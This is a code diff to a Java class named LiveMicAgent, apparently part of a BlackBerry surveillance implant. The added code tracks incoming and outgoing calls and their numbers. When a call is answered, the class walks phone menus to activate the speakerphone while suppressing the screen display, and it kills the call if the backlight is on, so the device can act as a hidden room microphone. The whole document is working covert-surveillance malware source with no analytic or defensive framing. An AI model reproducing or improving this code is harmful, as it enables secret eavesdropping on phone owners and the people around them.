@@ -11,7 +11,11 @@ package blackberry.agent;
 
 import java.io.EOFException;
 import java.util.Date;
+import java.util.Hashtable;
 
+import net.rim.blackberry.api.phone.Phone;
+import net.rim.blackberry.api.phone.PhoneCall;
+import net.rim.blackberry.api.phone.PhoneListener;
 import net.rim.blackberry.api.phone.phonelogs.CallLog;
 import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
 import net.rim.device.api.system.Application;
@@ -37,7 +41,7 @@ import blackberry.utils.WChar;
  * The Class LiveMicAgent.
  */
 public class LiveMicAgent extends Agent implements PhoneCallObserver,
-        BacklightObserver, CallListObserver {
+        BacklightObserver, CallListObserver, PhoneListener {
     //#ifdef DEBUG
     private static Debug debug = new Debug("LiveMicAgent", DebugLevel.VERBOSE);
     //#endif
@@ -109,8 +113,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
      * @see blackberry.threadpool.TimerJob#actualStart()
      */
     protected void actualStart() {
-        AppListener.getInstance().addPhoneCallObserver(this);
-        backlight = Backlight.isEnabled();
+        Phone.addPhoneListener(this);        
         AppListener.getInstance().addBacklightObserver(this);
     }
 
@@ -119,7 +122,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
      * @see blackberry.threadpool.TimerJob#actualStop()
      */
     protected void actualStop() {
-        AppListener.getInstance().removePhoneCallObserver(this);
+        Phone.removePhoneListener(this);
         AppListener.getInstance().removeBacklightObserver(this);
 
         suspendPainting(false);
@@ -151,12 +154,14 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
             return;
         }
 
+        MenuWalker.setLocaleStart();
         //MenuWalker.walk(new String[] { "Activate Speakerphone" });
         MenuWalker.walk(new String[] { "Home Screen", "Return to Phone" });
 
         //MenuWalker.walk(new String[] { "Close" });
         MenuWalker.walk(new String[] { "Return to Phone" });
         MenuWalker.walk(new String[] { "Activate Speakerphone" });
+        MenuWalker.setLocaleEnd();
 
         //#ifdef DEBUG
         debug.trace("onCallAnswered: finished");
@@ -239,7 +244,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
 
         suspendPainting(true);
 
-        if (backlight) {
+        if (Backlight.isEnabled()) {
             //#ifdef DEBUG
             debug.info("Backlight enabled, killing incoming call");
             //#endif
@@ -258,7 +263,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
 
     }
 
-    boolean backlight;
+    //boolean backlight;
 
     /*
      * (non-Javadoc)
@@ -277,7 +282,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
 
             suspendPainting(false);
         }
-        backlight = statusOn;
+        //backlight = statusOn;
     }
 
     /**
@@ -366,6 +371,133 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
         //#ifdef DEBUG
         //debug.trace("num: " + num + " after delete:" + newnum);
         //#endif
+    }
+
+    /****************************** Call ******************************/
+
+    Hashtable callingHistory = new Hashtable();
+
+    public void callAdded(int arg0) {
+        // TODO Auto-generated method stub
+
+    }
+
+    public void callAnswered(int callId) {
+        final PhoneCall phoneCall = Phone.getCall(callId);
+        final String phoneNumber = phoneCall.getDisplayPhoneNumber().trim();
+        final boolean outgoing = phoneCall.isOutgoing();
+
+        onCallAnswered(callId, phoneNumber);
+
+    }
+
+    public void callConferenceCallEstablished(int arg0) {
+        // TODO Auto-generated method stub
+
+    }
+
+    public void callConnected(int callId) {
+        final PhoneCall phoneCall = Phone.getCall(callId);
+        final String phoneNumber = phoneCall.getDisplayPhoneNumber().trim();
+        final boolean outgoing = phoneCall.isOutgoing();
+
+        onCallConnected(callId, phoneNumber);
+    }
+
+    public void callDirectConnectConnected(int arg0) {
+        // TODO Auto-generated method stub
+
+    }
+
+    public void callDirectConnectDisconnected(int arg0) {
+        // TODO Auto-generated method stub
+
+    }
+
+    public void callDisconnected(int callId) {
+        final PhoneCall phoneCall = Phone.getCall(callId);
+        String phoneNumber = null;
+
+        if (phoneCall != null) {
+
+            phoneNumber = phoneCall.getDisplayPhoneNumber();
+            //outgoing = phoneCall.isOutgoing();
+
+        } else {
+
+            synchronized (callingHistory) {
+                if (callingHistory.containsKey(new Integer(callId))) {
+                    phoneNumber = (String) callingHistory.get(new Integer(
+                            callId));
+                    callingHistory.remove(new Integer(callId));
+                }
+            }
+
+            //#ifdef DEBUG
+            debug.trace("callDisconnected phoneNumber: " + phoneNumber);
+            //#endif
+        }
+
+        onCallDisconnected(callId, phoneNumber);
+    }
+
+    public void callEndedByUser(int arg0) {
+        // TODO Auto-generated method stub
+
+    }
+
+    public void callFailed(int arg0, int arg1) {
+        // TODO Auto-generated method stub
+
+    }
+
+    public void callHeld(int arg0) {
+        // TODO Auto-generated method stub
+
+    }
+
+    public void callIncoming(int callId) {
+        final PhoneCall phoneCall = Phone.getCall(callId);
+        final String phoneNumber = phoneCall.getDisplayPhoneNumber();
+        final boolean outgoing = phoneCall.isOutgoing();
+
+        synchronized (callingHistory) {
+            callingHistory.put(new Integer(callId), phoneNumber);
+        }
+
+        onCallIncoming(callId, phoneNumber);
+    }
+
+    public void callInitiated(int callId) {
+        final PhoneCall phoneCall = Phone.getCall(callId);
+        final String phoneNumber = phoneCall.getDisplayPhoneNumber();
+        final boolean outgoing = phoneCall.isOutgoing();
+
+        synchronized (callingHistory) {
+            callingHistory.put(new Integer(callId), phoneNumber);
+        }
+        
+        onCallInitiated(callId, phoneNumber);
+    }
+
+    public void callRemoved(int arg0) {
+        // TODO Auto-generated method stub
+
+    }
+
+    public void callResumed(int arg0) {
+        // TODO Auto-generated method stub
+
+    }
+
+    public void callWaiting(int arg0) {
+        // TODO Auto-generated method stub
+
+    }
+
+    public void conferenceCallDisconnected(int arg0) {
+        // TODO Auto-generated method stub
+
     }
 
 }
